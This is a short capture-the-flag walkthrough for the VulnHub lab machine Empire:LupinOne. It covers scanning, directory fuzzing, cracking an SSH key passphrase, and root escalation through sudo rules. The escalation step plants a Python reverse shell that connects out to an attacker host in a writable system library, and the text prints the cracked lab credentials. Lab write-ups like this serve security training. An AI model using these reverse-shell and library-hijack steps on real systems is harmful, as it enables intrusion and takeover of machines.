
# Empire:LupinOne Walkthrough

**VulnHub Link:** [Empire:LupinOne](https://www.vulnhub.com/entry/empire-lupinone,750/)
**Difficulty:** Easy
**Release Date:** 21 Oct 2021


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.129

## 2.Web Enumeration

ffuf -c -ic -u 'http://192.168.100.129/FUZZ' -w /usr/share/wordlists/dirb/common.txt

ffuf -c -ic -u 'http://192.168.100.129/~secret/.FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-meidum.txt  -e .txt,.zip -fc 403,404

Decrypting mysecret.txt file in CyberChef

from base58 --> ssh private key got

ssh2john id_rsa > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/fasttrack.txt ---> P@55w0rd! passprhase found

ssh icex64@192.168.100.129 -i id_rsa (then enter passphrase)


## 3.Privilege Escalation

icex64 shell opened  -- user flag captured

sudo -l ---> (arsene) NOPASSWD /usr/bin/python3.9 /home/arsene/heist.py

we found out that webbrowser import used

find / -type f -name "+webbrowser+" 2>/dev/null

and see that we can write to /usr/lib/python3.9/webbrowser.py

adding python reverse shell to webbrowser.py (import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fi>

sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py (nc -nvlp 1234 before this)

and arsene shell opened cat /home/arsene/.secret --> arsene's password found ----> rQ8EE"UK,eV)weg~*nd-`5:{*"j7*Q

sudo -l ---> we can use pip as root without passwd

from GTFOBins , we did it and BINGO!!

Escalating to Root and Root flag captured...!
